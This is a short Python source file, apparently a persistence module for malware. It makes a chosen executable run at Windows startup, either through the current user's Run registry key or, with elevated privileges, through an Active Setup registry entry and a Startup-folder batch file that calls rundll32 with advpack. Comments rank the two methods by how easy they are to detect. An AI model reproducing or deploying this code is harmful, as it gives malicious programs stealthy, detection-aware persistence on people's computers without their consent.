import winreg
from elevate import elevate
import os

# No admin permissions required, easy to detect
def addToStartup(exec_path, name):
    key_path = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE) 
    winreg.SetValueEx(key_path, name, 0, winreg.REG_SZ, f'\"{exec_path}\"')

# Admin permissions required, harder to detect
def addToStartupAdmin(exec_path, name):
    elevate()
    reg_path = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Active Setup\\Installed Components") 
    new_key = winreg.CreateKey(reg_path, name) 
    winreg.SetValueEx(new_key, "RealStubPath", 0, winreg.REG_SZ, f'\"{exec_path}\"')
    with open(f'{os.environ['USERPROFILE']}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.bat', 'w') as startupFile:
        startupFile.write(f'START /MIN rundll32.exe advpack.dll, UserInstStubWrapper {name}')